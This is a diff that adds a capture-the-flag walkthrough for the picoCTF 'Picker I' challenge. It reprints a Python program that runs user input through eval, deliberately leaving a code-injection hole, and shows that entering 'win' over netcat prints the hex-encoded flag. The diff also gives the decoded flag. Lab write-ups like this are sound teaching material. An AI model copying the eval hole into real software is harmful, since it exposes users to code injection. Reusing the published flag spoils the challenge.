@@ -10,7 +10,11 @@ The program's source code can be downloaded [here](https://artifacts.picoctf.net
 
 ## Hints
 
+* Can you point the program to a function that does something useful for you?
+
 ## Walkthrough
+
+On starting the instance for this challenge we're given the option to download the source code for the program. This file is named [picker-I](./picker-I.py "Picker 1 python program") and contains the following code:
 
 ```python
 import sys
@@ -181,3 +185,52 @@ while(True):
     print(e)
 ```
 
+In order to make sense of this, let's remove the useless functions that seemingly exist only to distract us and waste our time. The two functions, "esoteric1" and "esoteric2", only contain code that is commented out so we'll get rid of them. That leaves us with the following code that is much easier to read and understand:
+
+```python
+import sys
+
+def getRandomNumber():
+  print(4)  # Chosen by fair die roll.
+            # Guaranteed to be random.
+            # (See XKCD)
+
+def exit():
+  sys.exit(0)
+
+def win():
+  # This line will not work locally unless you create your own 'flag.txt' in
+  #   the same directory as this script
+  flag = open('flag.txt', 'r').read()
+  #flag = flag[:-1]
+  flag = flag.strip()
+  str_flag = ''
+  for c in flag:
+    str_flag += str(hex(ord(c))) + ' '
+  print(str_flag)
+
+while(True):
+  try:
+    print('Try entering "getRandomNumber" without the double quotes...')
+    user_input = input('==> ')
+    eval(user_input + '()')
+  except Exception as e:
+    print(e)
+```
+
+The Python program never *directly* calls any of the defined functions, instead it prompts the user, suggesting that they type in "getRandomNumber" without quotations. Then the program uses the [(dangerous) eval function](https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html "Article on the dangers of Python's eval function") to interpret and execute the user’s input as code.
+
+Nothing is stopping us from ignoring the prompt and inputting "win" instead of "getRandomNumber". After calling "win" the program should print the encoded flag.
+
+```
+$ nc saturn.picoctf.net <PORT_NUMBER>
+Try entering "getRandomNumber" without the double quotes...
+==> win
+0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x34 0x5f 0x64 0x31 0x34 0x6d 0x30 0x6e 0x64 0x5f 0x31 0x6e 0x5f 0x37 0x68 0x33 0x5f 0x72 0x30 0x75 0x67 0x68 0x5f 0x36 0x65 0x30 0x34 0x34 0x34 0x30 0x64 0x7d 
+Try entering "getRandomNumber" without the double quotes...
+```
+
+Decoding 
+```0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x34 0x5f 0x64 0x31 0x34 0x6d 0x30 0x6e 0x64 0x5f 0x31 0x6e 0x5f 0x37 0x68 0x33 0x5f 0x72 0x30 0x75 0x67 0x68 0x5f 0x36 0x65 0x30 0x34 0x34 0x34 0x30 0x64 0x7d``` from hexadecimal will reveal the flag.
+
+```picoCTF{4_d14m0nd_1n_7h3_r0ugh_6e04440d}```
